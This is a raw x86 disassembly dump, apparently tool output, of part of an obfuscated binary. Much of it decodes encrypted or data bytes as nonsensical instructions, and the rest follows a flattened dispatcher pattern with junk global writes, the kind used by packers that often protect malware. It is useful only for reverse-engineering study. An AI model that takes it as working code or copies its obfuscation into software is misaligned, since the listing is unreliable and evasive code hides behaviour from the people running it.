  40e20e:	mov    es,WORD PTR [ecx+0x144b6d6d]
  40e214:	xor    eax,0xb52904ab
  40e219:	jmp    0x1e27:0x48eb22c8
  40e220:	dec    ebx
  40e221:	(bad)  
  40e222:	(bad)  
  40e223:	bound  esp,QWORD PTR [eax+0x46]
  40e226:	xchg   edi,eax
  40e227:	xor    ecx,esi
  40e229:	mov    DWORD PTR [esi-0x15],esp
  40e22c:	inc    esi
  40e22d:	gs mov edx,0x89bc4090
  40e233:	mov    eax,0xe46c6c89
  40e238:	dec    ebx
  40e239:	cmp    al,0x6c
  40e23b:	retf   0xcef5
  40e23e:	inc    edi
  40e23f:	dec    eax
  40e240:	jl     0x40e1ff
  40e242:	cmp    bh,BYTE PTR [ecx]
  40e244:	mov    ebx,0x5a2c1953
  40e249:	lods   al,BYTE PTR ds:[esi]
  40e24a:	push   esi
  40e24b:	mov    eax,ds:0x79478b88
  40e250:	hlt    
  40e251:	cmp    DWORD PTR [edx-0x2a],esp
  40e254:	lock out dx,al
  40e256:	inc    ebp
  40e257:	push   esi
  40e258:	push   edi
  40e259:	sbb    al,0xdc
  40e25b:	push   ss
  40e25c:	xchg   DWORD PTR [ebx-0x1acab935],ecx
  40e262:	adc    DWORD PTR [ecx+0x2c],0x515cd010
  40e269:	cmc    
  40e26a:	pushf  
  40e26b:	fs int3 
  40e26d:	dec    ebp
  40e26e:	inc    ecx
  40e26f:	push   0xfffffff4
  40e271:	mov    bl,0x7e
  40e273:	jmp    0x40e2a5
  40e275:	stos   BYTE PTR es:[edi],al
  40e276:	push   0x46ef52c9
  40e27b:	jecxz  0x40e27b
  40e27d:	sub    al,0xcd
  40e27f:	or     BYTE PTR [ecx-0x17ba76f9],0x8b
  40e286:	jge    0x40e290
  40e288:	inc    DWORD PTR ds:0x43360b
  40e28e:	xor    edi,esi
  40e290:	add    DWORD PTR ds:0x4336e3,0x2783
  40e29a:	mov    DWORD PTR [ebp-0xc],0xf89c85f1
  40e2a1:	mov    DWORD PTR [ebp-0x10],0xf89c8731
  40e2a8:	dec    DWORD PTR ds:0x43372b
  40e2ae:	add    edi,ebx
  40e2b0:	mov    DWORD PTR ds:0x433697,0x5e0d
  40e2ba:	jmp    0x40e83c
  40e2bf:	cmp    edi,0x40
  40e2c2:	jne    0x40e31a
  40e2c8:	movzx  eax,BYTE PTR ds:0x43360b
  40e2cf:	mov    eax,ds:0x4139b4
  40e2d4:	mov    eax,DWORD PTR [eax]
  40e2d6:	mov    DWORD PTR ds:0x4336d7,0x3f94
  40e2e0:	mov    DWORD PTR [ebp-0x14],eax
  40e2e3:	mov    DWORD PTR ds:0x43369f,0x877
  40e2ed:	mov    eax,ds:0x413bbc
  40e2f2:	mov    DWORD PTR ds:0x43361b,0x4b6e
  40e2fc:	mov    eax,DWORD PTR [eax]
  40e2fe:	mov    DWORD PTR ds:0x43371f,0x73ce
  40e308:	mov    DWORD PTR [ebp-0x18],eax
  40e30b:	mov    DWORD PTR ds:0x43372b,0x7077
  40e315:	jmp    0x40e830
  40e31a:	mov    DWORD PTR ds:0x4336df,0xab2
  40e324:	cmp    edi,0x33d
  40e32a:	mov    DWORD PTR ds:0x43371b,0x48b4
  40e334:	jne    0x40e3b3
  40e33a:	xor    DWORD PTR ds:0x4336d7,0x79d9
  40e344:	and    DWORD PTR [ebp+0x8],0x0
  40e348:	mov    eax,DWORD PTR [ebp-0x8]
  40e34b:	add    DWORD PTR ds:0x433653,0x43365f
  40e355:	sub    eax,DWORD PTR [ebp+0x8]
  40e358:	xor    DWORD PTR ds:0x4336a7,0x7a28
  40e362:	push   eax
  40e363:	sbb    DWORD PTR ds:0x4336d3,0x14e6
  40e36d:	mov    eax,DWORD PTR [ebp-0x4]
  40e370:	mov    DWORD PTR ds:0x4336d7,0x5b5
  40e37a:	add    eax,DWORD PTR [ebp+0x8]
  40e37d:	push   eax
  40e37e:	call   0x4032fa
  40e383:	mov    DWORD PTR ds:0x433603,0x5b4b
  40e38d:	inc    DWORD PTR [ebp+0x8]
  40e390:	cmp    DWORD PTR [ebp+0x8],0x52
  40e394:	mov    DWORD PTR ds:0x433603,0x3dd6
  40e39e:	jb     0x40e348
  40e3a4:	mov    DWORD PTR ds:0x433697,0x7cb6
  40e3ae:	jmp    0x40e830
  40e3b3:	mov    DWORD PTR ds:0x433603,0x6b28
  40e3bd:	cmp    edi,0x1a3
  40e3c3:	mov    DWORD PTR ds:0x4336af,0x27e
  40e3cd:	jne    0x40e58c
  40e3d3:	movzx  eax,BYTE PTR ds:0x43372b
  40e3da:	and    DWORD PTR ds:0x43360b,eax
  40e3e0:	mov    DWORD PTR [ebp-0x60],0xf89c853d
  40e3e7:	add    DWORD PTR ds:0x433663,0x2f92
  40e3f1:	mov    eax,DWORD PTR [ebp-0x4]
  40e3f4:	mov    DWORD PTR [ebp-0x5c],eax
  40e3f7:	mov    eax,DWORD PTR [ebp-0x8]
  40e3fa:	mov    DWORD PTR [ebp-0x58],eax
  40e3fd:	and    eax,DWORD PTR ds:0x433713
  40e403:	jmp    0x40e53c
  40e408:	test   al,0xb5
  40e40a:	test   al,0xe6
  40e40c:	mov    cl,0xe3
  40e40e:	jo     0x40e481
  40e410:	stc    
  40e411:	ret    0x425b
  40e414:	jns    0x40e477
  40e416:	enter  0x1619,0x98
  40e41a:	jle    0x40e49a
  40e41c:	adc    bh,BYTE PTR [edi+0x7e]
  40e41f:	jle    0x40e3b9
  40e421:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e422:	loop   0x40e3f4
  40e424:	pop    esp
  40e425:	mov    edx,0x83dc7233
  40e42a:	int3   
  40e42b:	adc    eax,DWORD PTR [ebx-0x3b]
  40e42e:	dec    esi
  40e42f:	push   0xffffffff
  40e431:	inc    eax
  40e432:	(bad)  
  40e433:	pop    ebx
  40e434:	jbe    0x40e467
  40e436:	(bad)  
  40e437:	mov    ecx,0x32769052
  40e43c:	adc    ch,BYTE PTR [eax+0x56]
  40e43f:	lock aad 0x41
  40e442:	test   BYTE PTR [esi+eax*1-0x30c13d17],dh
  40e449:	or     eax,0x1c76aec3
  40e44e:	jge    0x40e403
  40e450:	sub    DWORD PTR [edx+0x42b4a0cd],edx
  40e456:	icebp  
  40e457:	mov    cl,0x72
  40e459:	dec    ecx
  40e45a:	(bad)  
  40e45b:	cmc    
  40e45c:	mov    ebp,0x70ea7ff2
  40e461:	(bad)  
  40e462:	jp     0x40e3fd
  40e464:	loopne 0x40e3ee
  40e466:	or     edx,eax
  40e468:	add    eax,0x248b1a36
  40e46d:	jg     0x40e40b
  40e46f:	jmp    0x6c676ba4
  40e474:	std    
  40e475:	bndstx [edx+0x3b1f43a7],bnd3
  40e47c:	hlt    
  40e47d:	jno    0x40e4aa
  40e47f:	ja     0x40e425
  40e481:	push   ss
  40e482:	stc    
  40e483:	xor    eax,DWORD PTR [ebp+0x5e00fce]
  40e489:	jno    0x40e429
  40e48b:	scas   eax,DWORD PTR es:[edi]
  40e48c:	repnz push edx
  40e48e:	fbstp  TBYTE PTR [ecx+0x4e]
  40e491:	mov    eax,ds:0x78bf5659
  40e496:	jno    0x40e50d
  40e498:	xchg   ebp,eax
  40e499:	xor    BYTE PTR [eax+0x22e85d4a],cl
  40e49f:	pop    edx
  40e4a0:	fsubr  DWORD PTR [ebx]
  40e4a2:	ficomp WORD PTR [edx+ebp*1+0x59]
  40e4a6:	mov    ds,WORD PTR [ebx]
  40e4a8:	(bad)  
  40e4a9:	aam    0x1c
  40e4ab:	xchg   esi,eax
  40e4ac:	mov    edx,DWORD PTR [edi]
  40e4ae:	ins    DWORD PTR es:[edi],dx
  40e4af:	arpl   WORD PTR [edi-0x2980374a],bp
  40e4b5:	push   ebp
  40e4b6:	shr    BYTE PTR [ecx],cl
  40e4b8:	dec    eax
  40e4b9:	inc    ecx
  40e4ba:	inc    eax
  40e4bb:	xlat   BYTE PTR ds:[ebx]
  40e4bc:	and    eax,edx
  40e4be:	fdivr  QWORD PTR [ebx+edi*4]
  40e4c1:	mov    dl,0x41
  40e4c3:	loopne 0x40e52d
  40e4c5:	icebp  
  40e4c6:	jmp    0x881dd524
  40e4cb:	add    cl,BYTE PTR [edi]
  40e4cd:	xchg   ebp,eax
  40e4ce:	or     bl,BYTE PTR [edi]
  40e4d0:	pop    ebp
  40e4d1:	dec    esp
  40e4d2:	sbb    bh,BYTE PTR [ebx+0x7b]
  40e4d5:	out    0xdd,eax
  40e4d7:	(bad)  
  40e4d8:	int3   
  40e4d9:	js     0x40e4a2
  40e4db:	mov    ebp,0x3a96f78a
  40e4e0:	sub    DWORD PTR [ecx],esi
  40e4e2:	jg     0x40e4cf
  40e4e4:	inc    ebx
  40e4e5:	add    DWORD PTR [ebp+0x64],ecx
  40e4e8:	jge    0x40e49a
  40e4ea:	xlat   BYTE PTR ds:[ebx]
  40e4eb:	repz mov ebx,0xf16eea76
  40e4f1:	or     al,0xaa
  40e4f3:	rcl    BYTE PTR [ecx+0x1],1
  40e4f6:	push   edi
  40e4f7:	ins    BYTE PTR es:[edi],dx
  40e4f8:	jg     0x40e4e0
  40e4fa:	rol    BYTE PTR [ecx],0xf9
  40e4fd:	in     eax,0x53
  40e4ff:	cmp    BYTE PTR [edi+0x7c],0xa0
  40e503:	lods   eax,DWORD PTR ds:[esi]
  40e504:	cmp    bh,dh
  40e506:	and    dl,bl
  40e508:	push   ebp
  40e509:	int3   
  40e50a:	out    dx,al
  40e50b:	pop    ds
  40e50c:	xor    BYTE PTR [edx-0x14ad6f47],0x1c
  40e513:	fbld   TBYTE PTR [ecx-0x54]
  40e516:	repz jecxz 0x40e49a
  40e519:	(bad)  
  40e51a:	jmp    0xc17c:0xcdb35685
  40e521:	shr    ebp,cl
  40e523:	sbb    DWORD PTR [ebp-0xb],ebx
  40e526:	and    eax,0xbde92647
  40e52b:	mov    bh,0xdc
  40e52d:	lds    esp,FWORD PTR [edx]
  40e52f:	mov    bl,0x51
  40e531:	xor    BYTE PTR [edx+esi*2+0x68],bl
  40e535:	xchg   esp,eax
  40e536:	dec    esi
  40e537:	retf   
  40e538:	call   0x8c12c5fc
  40e53d:	inc    ebp
  40e53e:	hlt    
  40e53f:	or     DWORD PTR ds:0x4336a3,0x4336eb
  40e549:	xor    eax,esi
  40e54b:	add    eax,ebx
  40e54d:	sbb    DWORD PTR ds:0x4336db,0x4336af
  40e557:	mov    DWORD PTR [ebp-0x54],eax
  40e55a:	lea    eax,[ebp-0x1c]
  40e55d:	mov    DWORD PTR [ebp-0x50],eax
  40e560:	mov    eax,DWORD PTR [ebp-0x60]
  40e563:	xor    eax,esi
  40e565:	add    eax,ebx
  40e567:	mov    DWORD PTR [ebp-0x60],eax
  40e56a:	lea    eax,[ebp-0x60]
  40e56d:	push   eax
  40e56e:	mov    eax,DWORD PTR [ebp+0xc]
  40e571:	xor    eax,esi
  40e573:	add    eax,ebx
  40e575:	push   eax
  40e576:	mov    eax,ds:0x413b54
  40e57b:	push   0x413aaa
  40e580:	push   DWORD PTR [eax]
  40e582:	call   0x40984d
  40e587:	jmp    0x40e830
  40e58c:	cmp    edi,0x13d
  40e592:	jne    0x40e830
  40e598:	mov    eax,DWORD PTR [ebp-0x10]
  40e59b:	xor    eax,esi
  40e59d:	add    eax,ebx
  40e59f:	mov    DWORD PTR [ebp+0x8],eax
  40e5a2:	jmp    0x40e6db
  40e5a7:	shl    BYTE PTR [eax+eax*8-0xf8f9fd0],0x74
  40e5af:	sub    eax,0xbef261b8
  40e5b4:	bound  edx,QWORD PTR [eax+0x7e992ae6]
  40e5ba:	jle    0x40e5ce
  40e5bc:	jg     0x40e63c
  40e5be:	jle    0x40e611
  40e5c0:	add    eax,0x2e86f1f6
  40e5c5:	jo     0x40e56b
  40e5c7:	mov    dh,0xc2
  40e5c9:	bound  ebp,QWORD PTR [eax-0x59fd6c8c]
  40e5cf:	add    ecx,esp
  40e5d1:	xor    dl,bl
  40e5d3:	push   ebp
  40e5d4:	push   esi
  40e5d5:	test   DWORD PTR [esi+0x4],ebx
  40e5d8:	lea    ebp,[esi]
  40e5da:	adc    dl,cl
  40e5dc:	repz (bad) 
  40e5de:	push   eax
  40e5df:	cmp    eax,0xdd7a0dc5
  40e5e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e5e5:	pusha  
  40e5e6:	cmc    
  40e5e7:	int    0x72
  40e5e9:	loope  0x40e589
  40e5eb:	cmp    dl,BYTE PTR [eax]
  40e5ed:	rcl    BYTE PTR [ebx],cl
  40e5ef:	xchg   ecx,eax
  40e5f0:	xor    DWORD PTR [edx],esi
  40e5f2:	sub    al,0xc7
  40e5f4:	cmp    al,BYTE PTR [di+0x16]
  40e5f8:	ret    
  40e5f9:	mov    cl,0xe5
  40e5fb:	sbb    esi,ecx
  40e5fd:	jmp    0x40e5a0
  40e5ff:	in     al,0x8f
  40e601:	ret    
  40e602:	scas   eax,DWORD PTR es:[edi]
  40e603:	mov    cl,0xf3
  40e605:	in     al,0x54
  40e607:	in     al,dx
  40e608:	cmp    DWORD PTR [eax-0x59],eax
  40e60b:	cli    
  40e60c:	cmp    DWORD PTR [edx-0x35],0x1ac89edd
  40e613:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e614:	rol    DWORD PTR [ecx],0x4b
  40e617:	or     DWORD PTR [edx],eax
  40e619:	jle    0x40e5f3
  40e61b:	ret    
  40e61c:	xchg   esp,eax
  40e61d:	or     al,0x3e
  40e61f:	nop
  40e620:	xchg   edi,eax
  40e621:	cmp    eax,0xe0655bae
  40e626:	sbb    al,0xaf
  40e628:	sbb    BYTE PTR [edx],dh
  40e62a:	outs   dx,DWORD PTR ds:[esi]
  40e62b:	pop    eax
  40e62c:	loopne 0x40e5b6
  40e62e:	jmp    0x73eb548
  40e633:	(bad)  
  40e634:	adc    BYTE PTR [ecx],ah
  40e636:	pop    edx
  40e637:	jb     0x40e60d
  40e639:	and    edi,0xc919c7c
  40e63f:	add    DWORD PTR [ebp+0x3f6df110],edx
  40e645:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e646:	inc    esi
  40e647:	dec    edx
  40e648:	push   ds
  40e649:	mov    al,ds:0x8f822802
  40e64e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e64f:	fnstenv [ebx+0x32]
  40e652:	jne    0x40e63a
  40e654:	iret   
  40e655:	aaa    
  40e656:	xchg   ebx,eax
  40e657:	mov    al,0xe8
  40e659:	cmp    DWORD PTR [esi],ebx
  40e65b:	mov    esi,ecx
  40e65d:	xor    eax,0xd894ca29
  40e662:	(bad)  
  40e663:	mov    eax,0x3421acf2
  40e668:	mov    dl,BYTE PTR [esi]
  40e66a:	and    al,0xc7
  40e66c:	inc    esp
  40e66d:	inc    esi
  40e66e:	or     al,0xdc
  40e670:	xor    cl,BYTE PTR [ecx+0x5c4cd67e]
  40e676:	xchg   ebx,eax
  40e677:	cs (bad) 
  40e679:	sar    cl,1
  40e67b:	out    dx,eax
  40e67c:	imul   esi,DWORD PTR [esi+ecx*8],0x9b734de7
  40e683:	repnz push ecx
  40e685:	retf   
  40e686:	and    al,0x5c
  40e688:	adc    esi,edi
  40e68a:	push   cs
  40e68b:	retf   
  40e68c:	mov    dl,0x64
  40e68e:	adc    edx,esp
  40e690:	inc    esi
  40e691:	push   esi
  40e692:	xchg   esp,eax
  40e693:	xor    DWORD PTR [edx+0xa],0x5f
  40e697:	xchg   ebp,eax
  40e698:	xchg   edi,eax
  40e699:	pop    esi
  40e69a:	in     al,dx
  40e69b:	aad    0x81
  40e69d:	xor    ecx,DWORD PTR [eax+0x7f]
  40e6a0:	cli    
  40e6a1:	loopne 0x40e698
  40e6a3:	push   edx
  40e6a4:	mov    al,0x36
  40e6a6:	and    eax,0xce499a7c
  40e6ab:	std    
  40e6ac:	lock pop ss
  40e6ae:	mov    esp,0xa32f4fcc
  40e6b3:	jbe    0x40e6f6
  40e6b5:	add    BYTE PTR [ebx],ah
  40e6b7:	imul   edx,DWORD PTR [ebp+0x6f77468d],0xffffff96
  40e6be:	sub    bh,BYTE PTR [ecx+0x25]
  40e6c1:	mov    BYTE PTR [ebp+0x70],ch
  40e6c4:	data16 std 
  40e6c6:	adc    esp,eax
  40e6c8:	aaa    
  40e6c9:	push   esi
  40e6ca:	jo     0x40e6ab
  40e6cc:	and    ebp,DWORD PTR [edi+0x59598aca]
  40e6d2:	inc    esp
  40e6d3:	push   eax
  40e6d4:	xor    edi,esp
  40e6d6:	popf   
  40e6d7:	fisub  DWORD PTR [edx-0x35]
  40e6da:	addr16 mov eax,ds:0x3b34
  40e6de:	inc    ecx
  40e6df:	add    BYTE PTR [ecx+0x458b0845],cl
  40e6e5:	in     al,dx
  40e6e6:	jmp    0x40e81f
  40e6eb:	jb     0x40e70f
  40e6ed:	lods   al,BYTE PTR ds:[esi]
  40e6ee:	jmp    0x9bdf:0xa270706c
  40e6f5:	mov    al,BYTE PTR [ecx+0x1c4eb718]
  40e6fb:	into   
  40e6fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6fd:	jle    0x40e77d
  40e6ff:	adc    bh,BYTE PTR [edi+0x7e]
  40e702:	jle    0x40e716
  40e704:	and    esp,DWORD PTR [esi+ebx*4-0x45]
  40e708:	outs   dx,DWORD PTR ds:[esi]
  40e709:	das    
  40e70a:	cmp    BYTE PTR [esi-0x65],bl
  40e70d:	xchg   DWORD PTR [eax+0x3f],ebp
  40e710:	test   eax,0xa1e25d65
  40e715:	dec    eax
  40e716:	pop    ecx
  40e717:	repnz sub eax,0x641b905a
  40e71d:	xchg   esi,eax
  40e71e:	mov    al,0x81
  40e720:	jp     0x40e739
  40e722:	(bad)  
  40e723:	jmp    0xe21:0xeda0f37e
  40e72a:	pop    ss
  40e72b:	add    bh,BYTE PTR ds:0x585ffea8
  40e731:	mov    ecx,0xe1d5bab1
  40e736:	pop    esi
  40e737:	inc    ecx
  40e738:	sbb    al,0x25
  40e73a:	inc    esi
  40e73b:	rcr    DWORD PTR [ebx],0x7a
  40e73e:	(bad)  
  40e73f:	rcl    BYTE PTR [ebx+ebp*1-0x63],1
  40e743:	jecxz  0x40e757
  40e745:	enter  0x2aec,0xe0
  40e749:	sbb    DWORD PTR [edi],esi
  40e74b:	out    dx,eax
  40e74c:	add    al,0xde
  40e74e:	pop    edx
  40e74f:	(bad)  
  40e750:	sbb    BYTE PTR [ecx+0x31],cl
  40e753:	push   edx
  40e754:	(bad)  
  40e755:	pop    ds
  40e756:	fild   QWORD PTR [eax+0x17]
  40e759:	jo     0x40e725
  40e75b:	xchg   edi,eax
  40e75c:	loopne 0x40e792
  40e75e:	cmp    BYTE PTR [ecx-0x7cae27c9],0x5c
  40e765:	mov    bh,0xc2
  40e768:	sahf   
  40e769:	dec    ecx
  40e76a:	sbb    al,0x65
  40e76c:	jp     0x40e6f9
  40e76e:	in     eax,0x50
  40e770:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e771:	inc    ecx
  40e772:	loop   0x40e7c8
  40e774:	dec    edi
  40e775:	inc    edx
  40e776:	inc    ecx
  40e777:	loop   0x40e7b6
  40e779:	fwait
  40e77a:	sbb    al,BYTE PTR [edx]
  40e77c:	in     al,0x65
  40e77e:	sub    dh,BYTE PTR [edi+0x2a4c5931]
  40e784:	cdq    
  40e785:	mov    eax,0x5ae9a511
  40e78a:	inc    esp
  40e78b:	stos   BYTE PTR es:[edi],al
  40e78c:	dec    esp
  40e78d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e78e:	ss fwait
  40e790:	sub    edx,DWORD PTR [ebx]
  40e792:	test   BYTE PTR [ebx+eax*1-0x42ffd7b2],dh
  40e799:	fnsave [edx]
  40e79b:	add    bh,BYTE PTR [ebx+edx*1]
  40e79e:	sub    ch,BYTE PTR [edi-0x76]
  40e7a1:	enter  0x2137,0x5d
  40e7a5:	pop    esp
  40e7a6:	loope  0x40e73f
  40e7a8:	scas   al,BYTE PTR es:[edi]
  40e7a9:	int    0x23
  40e7ab:	and    esi,DWORD PTR [ebx]
  40e7ad:	repnz mov dl,0x59
  40e7b0:	mov    ch,0x4
  40e7b2:	cwde   
  40e7b3:	dec    ecx
  40e7b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e7b5:	hlt    
  40e7b6:	push   ecx
  40e7b7:	repz pop ss
  40e7b9:	mov    al,ds:0x6fbf8f9d
  40e7be:	sahf   
  40e7bf:	or     al,0x7c
  40e7c1:	leave  
  40e7c2:	inc    edi
  40e7c3:	std    
  40e7c4:	push   ebx
  40e7c5:	add    DWORD PTR [esi+0x15c8f317],esp
  40e7cb:	mov    bh,0x80
  40e7cd:	scas   al,BYTE PTR es:[edi]
  40e7ce:	adc    BYTE PTR [ecx+0xee309bb],ah
  40e7d4:	(bad)  
  40e7d5:	sar    BYTE PTR [edi+0x5f9a05f6],1
  40e7db:	jge    0x40e7e9
  40e7dd:	rcl    BYTE PTR [edi-0x66],1
  40e7e0:	sbb    al,0x6b
  40e7e2:	jbe    0x40e7c1
  40e7e4:	clc    
  40e7e5:	xlat   BYTE PTR ds:[ebx]
  40e7e6:	sub    BYTE PTR [esi-0x35],ch
  40e7e9:	or     al,0x67
  40e7eb:	cmc    
  40e7ec:	ins    DWORD PTR es:[edi],dx
  40e7ed:	xor    al,0x52
  40e7ef:	loop   0x40e7d9
  40e7f1:	jecxz  0x40e855
  40e7f3:	(bad)  
  40e7f4:	aas    
  40e7f5:	pushf  
  40e7f6:	push   es
  40e7f7:	mov    bh,0x72
  40e7f9:	dec    ebp
  40e7fa:	sbb    al,0x55
  40e7fc:	push   ebx
  40e7fd:	pushf  
  40e7fe:	es shr ecx,0xd1
  40e802:	mov    ecx,0x43de3ddb
  40e807:	mov    ecx,0x5adc1015
  40e80c:	daa    
  40e80d:	in     al,dx
  40e80e:	scas   al,BYTE PTR es:[edi]
  40e80f:	ja     0x40e794
  40e811:	ror    BYTE PTR [ecx+0x2bd4a5cf],cl
  40e817:	lds    esi,FWORD PTR [ecx]
  40e819:	arpl   ax,bx
  40e81b:	ret    0xe3c2
  40e81e:	out    0x89,al
  40e820:	inc    ebp
  40e821:	cld    
  40e822:	mov    eax,DWORD PTR [ebp-0x4]
  40e825:	push   0x4
  40e827:	pop    ecx
  40e828:	sub    ecx,eax
  40e82a:	add    ecx,DWORD PTR [ebp-0x18]
  40e82d:	mov    DWORD PTR [ebp-0x8],ecx
  40e830:	mov    eax,DWORD PTR [ebp+0xc]
  40e833:	xor    eax,esi
  40e835:	lea    edi,[edi+eax*1+0x32729b]
  40e83c:	cmp    edi,0x50b
  40e842:	jmp    0x40e97b
  40e847:	xor    al,0xd8
  40e849:	xchg   ebx,eax
  40e84a:	das    
  40e84b:	push   ebx
  40e84c:	jne    0x40e7fe
  40e84e:	loope  0x40e887
  40e850:	jecxz  0x40e800
  40e852:	loope  0x40e8ac
  40e854:	aas    
  40e855:	mov    eax,0x7ea7e222
  40e85a:	jle    0x40e86e
  40e85c:	jg     0x40e8dc
  40e85e:	jle    0x40e86b
  40e860:	shl    DWORD PTR [eax],cl
  40e862:	int    0xda
  40e864:	dec    edx
  40e865:	mov    ebx,0xf7be09ae
  40e86a:	lea    esp,[esi+0x46d6c1b0]
  40e870:	cld    
  40e871:	fisttp QWORD PTR [esi+edx*1]
  40e874:	adc    eax,DWORD PTR [eax-0x24]
  40e877:	push   0xffffff9f
  40e879:	(bad)  
  40e87a:	fcom   DWORD PTR [ecx-0x3cec970c]
  40e880:	mov    al,ds:0xe3e3af42
  40e885:	mov    esi,0xd867e87
  40e88a:	xchg   ecx,eax
  40e88b:	push   esp
  40e88c:	cmp    al,0x91
  40e88e:	loopne 0x40e87e
  40e890:	and    bh,cl
  40e892:	cld    
  40e893:	ret    
  40e894:	int    0xd0
  40e896:	stc    
  40e897:	mov    bl,0x67
  40e899:	dec    ecx
  40e89a:	in     al,0xb8
  40e89c:	fidiv  DWORD PTR [ecx]
  40e89e:	mov    DWORD PTR [ebx],0x3fbdd770
  40e8a4:	fidiv  DWORD PTR [edi-0x32a04806]
  40e8aa:	xchg   edi,eax
  40e8ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e8ac:	sub    eax,0xa000b77e
  40e8b1:	mov    al,dl
  40e8b3:	and    DWORD PTR [ebp+0x4c],edi
  40e8b6:	jmp    0x13db:0x40a5b981
  40e8bd:	inc    ebp
  40e8be:	sar    DWORD PTR [ebx],0x29
  40e8c1:	bound  ecx,QWORD PTR [edx-0x2e]
  40e8c4:	aam    0xa4
  40e8c6:	push   esp
  40e8c7:	xor    al,0x9e
  40e8c9:	jmp    0x40e8dd
  40e8cb:	bound  edi,QWORD PTR [ebp+0x25]
  40e8ce:	push   esi
  40e8cf:	cwde   
  40e8d0:	cmc    
  40e8d1:	dec    ebp
  40e8d2:	fwait
  40e8d3:	and    eax,0xf01c4029
  40e8d8:	outs   dx,BYTE PTR ds:[esi]
  40e8d9:	fild   WORD PTR [eax+eax*1]
  40e8dc:	mov    ch,0xb7
  40e8de:	jnp    0x40e872
  40e8e0:	push   edx
  40e8e1:	arpl   WORD PTR [edi],ax
  40e8e3:	lds    ecx,FWORD PTR [ebx+0x42]
  40e8e6:	adc    ebx,edx
  40e8e8:	scas   al,BYTE PTR es:[edi]
  40e8e9:	mov    esp,0xb3eaf3de
  40e8ee:	retf   0x663d
  40e8f1:	inc    eax
  40e8f2:	(bad)  
  40e8f3:	cld    
  40e8f4:	mov    eax,0x153994d
  40e8f9:	mov    cl,0xc8
  40e8fb:	rcl    BYTE PTR [esi-0x2c],1
  40e8fe:	dec    ebx
  40e8ff:	xor    eax,0x166e2072
  40e904:	inc    esp
  40e905:	push   0x299bae70
  40e90a:	pop    ecx
  40e90b:	dec    edi
  40e90c:	or     al,0x77
  40e90e:	iret   
  40e90f:	inc    edx
  40e910:	das    
  40e911:	pushf  
  40e912:	loopne 0x40e8be
  40e914:	add    BYTE PTR [edx],dh
  40e916:	jl     0x40e901
  40e918:	fisub  DWORD PTR [ebx+0x20]
  40e91b:	sbb    ecx,DWORD PTR [eax]
  40e91d:	pop    edx
  40e91e:	(bad)  
  40e920:	mov    ebx,0x56955dd0
  40e925:	xor    DWORD PTR [eax+0x26],0x65
  40e929:	inc    edi
  40e92a:	les    dx,DWORD PTR [ecx]
  40e92d:	adc    DWORD PTR [ebx],esi
  40e92f:	lock out 0x93,al
  40e932:	call   0x68d19030
  40e937:	or     ah,bl
  40e939:	bound  ecx,QWORD PTR [eax-0x3a]
  40e93c:	test   eax,0xb5214228
  40e941:	mov    edi,0x370d1551
  40e946:	xchg   ebp,edi
  40e948:	div    DWORD PTR [ecx+0x2351bdce]
  40e94e:	cmp    BYTE PTR [eax+0x7f],bh
  40e951:	rcl    BYTE PTR [ebx+0x18abd31c],cl
  40e957:	inc    eax
  40e958:	mov    ecx,0xd16bc80a
  40e95d:	outs   dx,DWORD PTR ds:[esi]
  40e95e:	retf   0x1116
  40e961:	fstp   QWORD PTR [esi+0x5caf8bef]
  40e967:	arpl   WORD PTR [ebp+ecx*1-0x2364c98b],bp
  40e96e:	(bad)  
  40e96f:	iret   
  40e970:	mov    al,0xad
  40e972:	push   ss
  40e973:	gs xchg edi,eax
  40e975:	mov    esi,?
  40e977:	dec    ecx
  40e978:	ins    DWORD PTR es:[edi],dx
  40e979:	jmp    0x40e9bd
  40e97b:	jne    0x40e2bf
  40e981:	mov    eax,DWORD PTR [ebp+0xc]
  40e984:	pop    edi
  40e985:	xor    eax,esi
  40e987:	pop    esi
  40e988:	jmp    0x40eac1
  40e98d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e98e:	sbb    bl,dh
  40e990:	loope  0x40ea05
  40e992:	icebp  
  40e993:	mov    ch,0x58
  40e995:	jns    0x40e920
  40e997:	add    eax,0xf7815f1d
  40e99c:	mov    eax,0x7e7ea486
  40e9a1:	adc    bh,BYTE PTR [edi+0x7e]
  40e9a4:	jle    0x40e950
  40e9a6:	xor    DWORD PTR [ebx-0x56c9bada],edi
  40e9ac:	push   0xa04c3f40
  40e9b1:	mov    cl,0xe
  40e9b3:	or     ah,BYTE PTR [esi+0x4741e17e]
  40e9b9:	inc    ebx
  40e9ba:	push   edx
  40e9bb:	xchg   edx,eax
  40e9bc:	xchg   ecx,eax
  40e9bd:	mov    cl,0x96
  40e9bf:	dec    BYTE PTR [ecx+edi*8]
  40e9c2:	pop    ss
  40e9c3:	data16 adc bl,al
  40e9c6:	shl    DWORD PTR ds:0x1e7208f7,1
  40e9cc:	and    BYTE PTR [ebp-0x552e8f6c],bh
  40e9d2:	nop
  40e9d3:	dec    ebx
  40e9d4:	xor    DWORD PTR [ecx+eiz*4+0x14],edx
  40e9d8:	sub    ch,ah
  40e9da:	popf   
  40e9db:	and    esi,DWORD PTR [ebx-0x61945a82]
  40e9e1:	xchg   DWORD PTR cs:[eax-0x8],esp
  40e9e5:	mov    al,0x9d
  40e9e7:	xor    BYTE PTR [edx],ch
  40e9e9:	xor    DWORD PTR [eax-0xa],eax
  40e9ec:	mov    ebx,0xd23df0aa
  40e9f1:	xchg   bh,ch
  40e9f3:	mov    ecx,0xd292e29b
  40e9f8:	sbb    dh,BYTE PTR [eax+0x23]
  40e9fb:	jnp    0x40e9d4
  40e9fd:	cmp    al,0x91
  40e9ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ea00:	sbb    DWORD PTR [eax+0x5f937382],ebx
  40ea06:	jecxz  0x40ea27
  40ea08:	mov    ds:0x1f274f3a,al
  40ea0d:	push   eax
  40ea0e:	mov    dl,0x2c
  40ea10:	aam    0x40
